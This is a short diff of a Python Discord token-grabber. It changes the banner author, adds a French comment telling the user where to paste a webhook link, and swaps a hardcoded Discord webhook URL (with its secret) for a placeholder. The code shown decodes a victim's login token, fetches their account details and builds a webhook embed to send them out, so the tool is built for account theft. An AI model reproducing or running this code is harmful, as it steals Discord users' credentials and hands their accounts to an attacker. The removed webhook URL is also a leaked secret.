@@ -1,3 +1,4 @@
+#entrez le lien de votre webhook ligne 257 
 import base64
 import json
 import colorama
@@ -32,7 +33,7 @@ intro = """
            (((*}(//(_|_)\\                        .
            )*))))\\*).( //            +  .
   *        (((((*(// / )/                   |
-            ))))))/ / /`                   -O-     @           By Thibault
+            ))))))/ / /`                   -O-     @           By WaTT_mc
 +           `(*(((/ /`                      |
           o  `)))*))`\            *         
                `((((  `-.__     ,      .  
@@ -254,7 +255,7 @@ class DiscordAuthWebsocket:
             self.user.token = token.decode()
             self.user.getAccInfo()
             print(self.user.pretty_print())
-            webhook = DiscordWebhook(url='https://discord.com/api/webhooks/809152615023509545/-8s-5dzrjhjpIYNRiDB78pi_0Rn7uNxjNcyjJoebX-uRBBuG-zNyX3rWYchAiKGc1bos')
+            webhook = DiscordWebhook(url='ICI')
             embed = DiscordEmbed(color=0x9b59b6)
             embed.set_author(name=f'{self.user.username}#{self.user.discrim} ({self.user.id})', url='http://discord.com/login', icon_url=f'https://cdn.discordapp.com/avatars/{self.user.id}/{self.user.avatar_hash}.png')
             embed.set_thumbnail(url=f'https://cdn.discordapp.com/avatars/{self.user.id}/{self.user.avatar_hash}.png')
